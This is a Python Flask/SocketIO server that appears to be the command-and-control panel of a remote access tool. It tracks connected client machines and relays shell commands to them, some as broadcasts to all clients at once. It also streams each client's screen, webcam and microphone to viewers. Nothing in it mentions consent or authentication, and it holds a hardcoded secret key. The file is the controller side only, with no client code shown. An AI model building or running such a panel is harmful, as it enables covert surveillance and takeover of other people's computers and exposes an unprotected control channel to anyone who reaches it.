from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit
import uuid
import time
import os
import sys
import psutil
import subprocess

app = Flask(__name__)
app.config["SECRET_KEY"] = "5L4fegZokdfg35hrLOZ76XLrSWLfNVwX1XRPM"
socketio = SocketIO(app, max_http_buffer_size=16 * 1024 * 1024)  # 16MB buffer for screen sharing

# Store clients by their unique ID
clients = {}

def restart_program():
    """
    Completely exits the current program and starts a fresh instance.
    Handles different running environments (script vs executable) and
    ensures clean process termination.
    """
    try:
        # Get the current process
        current_pid = os.getpid()
        current_process = psutil.Process(current_pid)
        
        # Clear console screen
        if os.name == 'nt':  # Windows
            os.system('cls')
        else:  # Unix/Linux/Mac
            os.system('clear')
            
        # Determine how to restart based on how the program is running
        if getattr(sys, 'frozen', False):
            # If running as a compiled executable
            executable = sys.executable
            args = []
        else:
            # If running as a Python script
            executable = sys.executable
            args = sys.argv
            
        # Start new process
        subprocess.Popen([executable] + args, 
                        creationflags=subprocess.CREATE_NEW_CONSOLE if os.name == 'nt' else 0)
        
        # Close all file handles and cleanup
        try:
            for handler in current_process.open_files() + current_process.connections():
                os.close(handler.fd)
        except Exception:
            pass
            
        # Terminate the current process
        current_process.terminate()
        os._exit(0)
        
    except Exception as e:
        print(f"Error restarting program: {e}")
        # Wait for user input before exiting if there's an error
        input("Press Enter to exit...")
        sys.exit(1)

@app.route("/")
def dashboard():
    """Render the web dashboard."""
    return render_template("dashboard.html", clients=clients)

@app.route("/screen/<client_id>")
def screen_view(client_id):
    if client_id in clients:
        client_name = clients[client_id]["username"]
        client_os = clients[client_id]["os_version"]
        return render_template("screen.html", 
                             client_id=client_id,
                             client_name=client_name,
                             client_os=client_os)
    return "Client not found", 404

@app.route("/shell/<client_id>")
def shell_view(client_id):
    if client_id in clients:
        client_name = clients[client_id]["username"]
        client_os = clients[client_id]["os_version"]
        return render_template("shell.html", 
                             client_id=client_id,
                             client_name=client_name,
                             client_os=client_os)
    return "Client not found", 404

@app.route("/camera/<client_id>")
def camera_view(client_id):
    if client_id in clients:
        client_name = clients[client_id]["username"]
        client_os = clients[client_id]["os_version"]
        return render_template("camera.html", 
                             client_id=client_id,
                             client_name=client_name,
                             client_os=client_os)
    return "Client not found", 404

@socketio.on("connect")
def handle_connect():
    """Handles client and dashboard connections."""
    client_id = request.sid
    if request.referrer and 'dashboard.html' in request.referrer:
        print(f"Dashboard connected: {client_id}")
    else:
        emit("client_id_assigned", {"unique_id": client_id}, room=client_id)
        print(f"Client connected: {client_id}")

@socketio.on("register_client")
def handle_register_client(data):
    """Handles client registration and reconnection."""
    client_id = request.sid
    received_unique_id = data.get("unique_id")

    if received_unique_id in clients:
        clients[received_unique_id]["sid"] = client_id
    else:
        clients[received_unique_id] = {
            "sid": client_id,
            "username": data["username"],
            "os_version": data["os_version"],
            "last_seen": time.time()
        }

    emit("client_update", clients, broadcast=True)
    print(f"Client registered/updated: {data}")

@socketio.on("disconnect")
def handle_disconnect():
    """Handle client disconnections."""
    client_id = request.sid
    
    for unique_id, client_data in list(clients.items()):
        if client_data["sid"] == client_id:
            # Remove client from rooms and list
            socketio.server.leave_room(client_id, f"screen_{unique_id}")
            del clients[unique_id]
            break

    emit("client_update", clients, broadcast=True)
    print(f"Client disconnected: {client_id}")

@socketio.on("command")
def handle_command(data):
    """Send a command to a specific client."""
    unique_id = data["unique_id"]
    command = data["command"]
    
    if command == "restart_server":
        print("Restarting server...")
        # Notify all clients before restarting
        emit("action_status", {
            "action": "restart_server",
            "status": "Server is restarting...",
        }, broadcast=True)
        # Give time for the message to be sent
        socketio.sleep(1)
        restart_program()
        return

    if unique_id in clients:
        command_data = {"command": command}
        if "message" in data:
            command_data["message"] = data["message"]
            
        client_sid = clients[unique_id]["sid"]
        emit("execute", command_data, room=client_sid)
        print(f"Command '{command}' sent to client {unique_id}")
    else:
        print(f"Client {unique_id} not found.")

@socketio.on("global_command")
def handle_global_command(data):
    """Send a command to all connected clients."""
    command = data["command"]
    
    if command == "restart_server":
        print("Restarting server...")
        # Notify all clients before restarting
        emit("action_status", {
            "action": "restart_server",
            "status": "Server is restarting...",
        }, broadcast=True)
        # Give time for the message to be sent
        socketio.sleep(1)
        restart_program()
        return

    command_data = {"command": command}
    if "message" in data:
        command_data["message"] = data["message"]
    
    for unique_id, client_data in clients.items():
        emit("execute", command_data, room=client_data["sid"])
    
    print(f"Global command '{command}' sent to all clients")

@socketio.on("screen_frame")
def handle_screen_frame(data):
    """Broadcast screen frame to viewers."""
    client_id = request.sid
    # Find the unique_id for this client
    for unique_id, client_data in clients.items():
        if client_data["sid"] == client_id:
            # Broadcast to room specific to this client's screen share
            emit("screen_update", data, room=f"screen_{unique_id}")
            break

@socketio.on("join_screen_room")
def join_screen_room(data):
    """Join a specific client's screen sharing room."""
    room = f"screen_{data['client_id']}"
    emit("join_success", room=request.sid)
    socketio.server.enter_room(request.sid, room)
    print(f"Viewer joined screen room: {room}")
    emit("join_success", broadcast=True)

@socketio.on('request_client_list')
def handle_request_client_list():
    """Send the current client list to the dashboard."""
    emit('client_update', clients, room=request.sid)

@socketio.on("update_quality")
def handle_quality_update(data):
    """Update screen sharing quality for a client."""
    unique_id = data["unique_id"]
    quality = data["quality"]
    
    if unique_id in clients:
        client_sid = clients[unique_id]["sid"]
        emit("execute", {
            "command": "update_quality",
            "quality": quality
        }, room=client_sid)

@socketio.on("shell_output")
def handle_shell_output(data):
    """Broadcast shell output to the appropriate viewer."""
    output = data.get("output", "")
    output_type = data.get("type", "stdout")
    client_id = request.sid
    
    # Find the unique_id and client info for this client
    client_info = None
    for unique_id, client_data in clients.items():
        if client_data["sid"] == client_id:
            client_info = {
                "unique_id": unique_id,
                "username": client_data["username"],
                "os_version": client_data["os_version"]
            }
            break
    
    print(f"Received shell output: {output}")  # Debug line
    
    # Broadcast to the current room
    emit("shell_output", {
        "output": output,
        "type": output_type,
        "client_info": client_info
    }, broadcast=True)

@socketio.on("shell_command")
def handle_shell_command(data):
    """Send shell command to a specific client."""
    unique_id = data["unique_id"]
    command = data["command"]
    shell_type = data["shell_type"]
    
    if unique_id in clients:
        client_sid = clients[unique_id]["sid"]
        # Join a specific room for this shell session
        room = f"shell_{unique_id}"
        socketio.server.enter_room(request.sid, room)
        
        print(f"Sending shell command to client {unique_id}: {command}")  # Debug line
        
        emit("execute", {
            "command": "shell",
            "shell_command": command,
            "shell_type": shell_type
        }, room=client_sid)

@socketio.on("action_completed")
def handle_action_completed(data):
    """Handle completion notifications from clients."""
    client_id = request.sid
    action = data.get("action")
    status = data.get("status", "completed")
    
    # Find client info
    client_info = None
    for unique_id, client_data in clients.items():
        if client_data["sid"] == client_id:
            client_info = {
                "unique_id": unique_id,
                "username": client_data["username"],
                "os_version": client_data["os_version"]
            }
            break
    
    # Broadcast the completion status
    emit("action_status", {
        "action": action,
        "status": status,
        "client_info": client_info
    }, broadcast=True)

@socketio.on("join_camera_room")
def join_camera_room(data):
    room = f"camera_{data['client_id']}"
    socketio.server.enter_room(request.sid, room)
    print(f"Viewer joined camera room: {room}")
    emit("join_success", broadcast=True)

@socketio.on("camera_frame")
def handle_camera_frame(data):
    client_id = request.sid
    for unique_id, client_data in clients.items():
        if client_data["sid"] == client_id:
            emit("camera_frame", data, room=f"camera_{unique_id}")
            break

@socketio.on("audio_data")
def handle_audio_data(data):
    client_id = request.sid
    for unique_id, client_data in clients.items():
        if client_data["sid"] == client_id:
            emit("audio_data", data, room=f"camera_{unique_id}")
            break

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=80)